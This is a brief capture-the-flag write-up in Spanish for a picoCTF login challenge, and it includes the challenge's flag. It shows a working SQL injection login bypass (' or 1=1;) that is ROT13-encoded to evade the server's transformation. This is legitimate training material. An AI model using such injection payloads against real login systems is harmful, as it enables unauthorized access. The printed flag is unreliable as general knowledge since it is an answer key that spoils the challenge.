# Objetivo 

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
# Solución 
```
password: ' or 1=1;
SQL query: SELECT * FROM admin where password = '' be 1=1;'


se ve que nos cambia or por be 

asi que puisimos a prueba un  ejemplo como hola mundo y utilizando 
el cyberchef poniendo el root13 nos idientificamos que es lo que nos cambia  

asi que a hora en el cyberchef  ponemos ' or  1=1; lo cambia en el root13 y nos da ' be 1=1; y a hora ponemos eso en el password 

password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}

```
# Notas 

